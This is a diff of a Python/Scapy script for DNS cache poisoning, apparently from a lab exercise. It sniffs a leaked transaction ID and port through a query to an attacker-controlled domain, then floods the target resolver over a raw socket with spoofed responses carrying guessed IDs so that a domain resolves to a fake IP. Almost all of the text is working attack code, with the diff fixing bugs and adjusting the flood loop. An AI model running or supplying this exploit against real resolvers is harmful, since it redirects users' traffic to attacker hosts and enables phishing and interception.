@@ -12,14 +12,14 @@ fake_ip = "6.6.6.6"
 
 print("[*] 1 & 2. Sniffing for predictable TXID and Port on a controlled domain...")
 # Start sniffer in background
-def sniff_port_and_txid():
-    sniffer = AsyncSniffer(iface=None, filter="udp and src host " + target_dns + " and dst port 53", count=1, timeout=10)
+def leak():
+    sniffer = AsyncSniffer(iface="eth0", filter="udp and src host " + target_dns + " and dst port 53", count=1, timeout=10)
     sniffer.start()
     time.sleep(0.5)
 
     # Send query for a domain we control to leak the port and current TXID
     # local-dns -> root-dns (.153) -> attacker-dns (.155) -> attacker machine (.10)
-    trigger_leak = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname=str(random.randint(0,10000)) + ".leak.attacker.com"))
+    trigger_leak = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="www.leak.attacker.com"))
     send(trigger_leak, verbose=0)
 
     sniffer.join()
@@ -28,18 +28,17 @@ def sniff_port_and_txid():
     if not sniffed or len(sniffed) == 0:
         print("[-] Could not sniff packet. Make sure to run on the correct interface.")
         exit(1)
+
     leaked_txid = sniffed[0][DNS].id
     target_port = sniffed[0][UDP].sport
     print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
-    return leaked_txid, target_port  # BUG 1 was here — missing return
+    return leaked_txid, target_port
 
-leaked_txid, target_port = sniff_port_and_txid()
-leaked_txid, target_port = sniff_port_and_txid()
-
+leaked_txid, target_port = leak()
 
 print("[*] 3. Sending request to resolve www.example.com...")
 trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
-send(trigger, verbose=0)
+#send(trigger, verbose=0)
 
 print("[*] 4. Flooding spoofed responses with predictable IDs...")
 base_pkt = (
@@ -52,9 +51,14 @@ base_pkt = (
 raw_bytes = bytearray(raw(base_pkt))
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
-# Flood all possible TXIDs since it might be fully randomized or incrementing slightly
-for txid in range(0, 65536):
-    struct.pack_into('!H', raw_bytes, 28, leaked_txid + txid)  # Update TXID in the raw packet
+trigger_payload = raw(DNS(rd=1, qd=DNSQR(qname=domain)))
+s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# make 256 requests, and responses
+
+for i in range(0, 256):
+    s_udp.sendto(trigger_payload, (target_dns, 53))
+    struct.pack_into('!H', raw_bytes, 28, random.randint(0, 65535))
     s.sendto(raw_bytes, (target_dns, 0))
 
 print("[*] 5. Testing if attack was successful...")
